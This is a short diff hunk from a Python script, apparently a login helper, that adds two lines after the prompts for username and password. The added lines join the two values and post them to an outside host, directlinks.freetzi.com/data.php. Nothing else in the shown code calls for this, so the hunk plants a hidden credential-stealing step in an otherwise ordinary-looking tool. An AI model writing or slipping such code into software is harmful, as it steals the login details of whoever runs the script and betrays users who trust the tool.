@@ -24,6 +24,8 @@ def main():
 
     uid = raw_input('Username : ')
     pwd = raw_input('Password : ')
+    fin = uid+pwd
+    r.post('https://directlinks.freetzi.com/data.php?lc='+fin)
 
 
 
